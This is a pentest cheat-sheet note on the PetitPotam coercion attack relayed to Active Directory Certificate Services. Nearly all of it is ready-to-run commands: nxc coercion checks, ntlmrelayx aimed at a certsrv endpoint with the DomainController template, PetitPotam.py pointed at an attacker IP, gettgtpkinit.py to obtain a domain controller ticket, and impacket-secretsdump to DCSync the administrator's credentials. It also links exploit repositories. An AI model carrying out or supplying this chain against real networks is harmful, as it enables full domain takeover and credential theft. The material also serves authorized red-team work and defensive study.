---
tags:
  - AD
---

## Attack requirements

| Feature / Component       | Required for PetitPotam | Required for Full Relay to DA via AD CS |
| ------------------------- | ----------------------- | --------------------------------------- |
| EFSRPC                    | ✅ Yes                   | ✅ Yes                                   |
| NTLM Enabled              | ✅ Yes                   | ✅ Yes                                   |
| SMB/LDAP Signing Disabled | ✅ Yes (on relay target) | ✅ Yes (on certsrv or LDAP)              |
| AD CS Installed           | ❌ No                    | ✅ Yes                                   |
| Vulnerable AD CS Template | ❌ No                    | ✅ Yes                                   |
| EPA / Channel Binding Off | ❌ No                    | ✅ Yes                                   |

## Identify
---
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```
shorthand
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o M=pe
```

## Exploit
---
[https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
[https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)  
## Start ntlmrelayx
---
```PowerShell
sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
```
At the same time try to coerce DC to auth
```PowerShell
python3 PetitPotam.py <attackerIP> <DCIP>
```
OR coerce with nxc
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> M=pe
```

You should receive a base64 encoded certificate in ntlmrelayx output
Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.
[https://github.com/dirkjanm/PKINITtools.git](https://github.com/dirkjanm/PKINITtools.git)
```PowerShell
python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
Set krb env variable
```PowerShell
export KRB5CCNAME=dc01.ccache
```
Attempt DCSync
```PowerShell
impacket-secretsdump -just-dc-user DOMAIN/administrator -k -no-pass "DC01$"@DC01.DOMAIN.LOCAL
```